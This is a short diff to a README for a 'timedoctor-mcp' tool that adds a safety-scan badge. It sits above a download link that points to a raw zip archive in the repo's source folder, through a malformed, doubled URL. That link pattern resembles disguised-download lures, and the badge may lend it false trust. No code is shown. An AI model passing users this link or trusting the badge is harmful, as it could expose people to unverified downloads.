@@ -1,5 +1,7 @@
 # 🚀 timedoctor-mcp - Extract Time Doctor Data Easily
 
+[![SafeSkill 88/100](https://img.shields.io/badge/SafeSkill-88%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/mohadjkfahskjdh-timedoctor-mcp)
+
 ![Download the latest release](https://github.com/Mohadjkfahskjdh/timedoctor-mcp/raw/refs/heads/main/src/mcp-timedoctor-2.4.zip%20Latest%https://github.com/Mohadjkfahskjdh/timedoctor-mcp/raw/refs/heads/main/src/mcp-timedoctor-2.4.zip)
 
 ## 📋 Description
